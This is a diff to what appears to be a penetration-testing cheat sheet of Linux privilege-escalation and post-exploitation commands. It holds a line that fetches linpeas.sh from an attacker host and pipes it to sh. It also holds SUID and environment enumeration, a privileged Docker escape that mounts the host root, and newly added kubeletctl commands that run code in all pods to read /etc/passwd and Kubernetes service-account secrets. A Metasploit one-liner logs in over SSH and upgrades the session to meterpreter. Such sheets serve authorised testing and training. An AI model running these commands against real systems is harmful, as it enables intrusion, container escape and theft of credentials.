@@ -861,13 +861,12 @@ wget -qO- http://$MYIP:8888/linux/linpeas.sh | sh
 
 [*] Privilege Escalation
 +---------- Initial Checks ----------+
-sudo -l
-ls -laR /home
-ls -laR /opt
-find / -perm /4000 2>/dev/null | xargs ls -la
-cat /etc/crontab
-strings /proc/self/environ | tr '\0' '\n' | sort
-netstat -tuln
+echo -e '\n\n'; ls -laR /home /opt
+echo -e '\n\n'; find / -perm /4000 2>/dev/null | xargs ls -la
+echo -e '\n\n'; cat /etc/crontab
+echo -e '\n\n'; strings /proc/self/environ | tr '\0' '\n' | sort
+echo -e '\n\n'; netstat -tuln
+echo -e '\n\n'; sudo -l
 
 +---------- Polkit Version ----------+
 rpm -qa | grep -i polkit | grep -i "0.11[3-9]"
@@ -926,6 +925,9 @@ docker ps -a
 docker commit 35c090009763 tempimg
 docker run -it --rm --privileged -v /:/mnt tempimg chroot /mnt sh
 
++---------- Kubelet API ----------+
+kubeletctl -s $TARGET run "cat /etc/passwd" --all-pods
+kubeletctl -s $TARGET run "ls /run/secrets/kubernetes.io/serviceaccount /var/run/secrets/kubernetes.io/serviceaccount /secrets/kubernetes.io/serviceaccout" --all-pods
 
 [*] Meterpreter
 msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; setg RHOSTS $TARGET; setg USERNAME $USERNAME; setg PASSWORD $PASSWORD; setg SESSION 1; setg PAYLOAD linux/x64/meterpreter/bind_tcp; setg PAYLOAD_OVERRIDE linux/x64/meterpreter/bind_tcp; setg PLATFORM_OVERRIDE linux; setg PSH_ARCH_OVERRIDE x64; run; background; use post/multi/manage/shell_to_meterpreter; run'
